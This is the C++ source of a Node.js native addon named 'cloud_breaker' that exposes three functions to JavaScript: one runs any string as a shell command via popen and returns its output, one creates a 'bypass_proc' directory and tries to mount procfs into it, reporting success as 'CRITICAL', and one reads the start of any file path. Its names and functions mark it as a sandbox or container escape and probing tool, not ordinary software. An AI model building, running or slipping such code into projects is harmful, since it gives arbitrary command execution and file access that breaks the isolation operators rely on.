#include <napi.h>
#include <iostream>
#include <fstream>
#include <string>
#include <sys/mount.h>
#include <sys/stat.h>
#include <unistd.h>

using namespace Napi;

Value Execute(const CallbackInfo& info) {
    Env env = info.Env();
    std::string command = info[0].As<String>().Utf8Value();
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen((command + " 2>&1").c_str(), "r");
    if (!pipe) return String::New(env, "popen() failed!");
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) { result += buffer; }
    pclose(pipe);
    return String::New(env, result);
}

Value TryMount(const CallbackInfo& info) {
    Env env = info.Env();
    mkdir("bypass_proc", 0777);
    int result = mount("proc", "bypass_proc", "proc", 14, NULL);
    if (result == 0) return String::New(env, "CRITICAL: Mount Success!");
    return String::New(env, "Mount failed: " + std::to_string(result));
}

Value RawRead(const CallbackInfo& info) {
    Env env = info.Env();
    std::string path = info[0].As<String>().Utf8Value();
    std::ifstream file(path);
    if (!file.is_open()) return String::New(env, "Access Denied");
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    return String::New(env, content.substr(0, 500));
}

Object Init(Env env, Object exports) {
    exports.Set(String::New(env, "execute"), Function::New(env, Execute));
    exports.Set(String::New(env, "tryMount"), Function::New(env, TryMount));
    exports.Set(String::New(env, "rawRead"), Function::New(env, RawRead));
    return exports;
}

NODE_API_MODULE(cloud_breaker, Init)
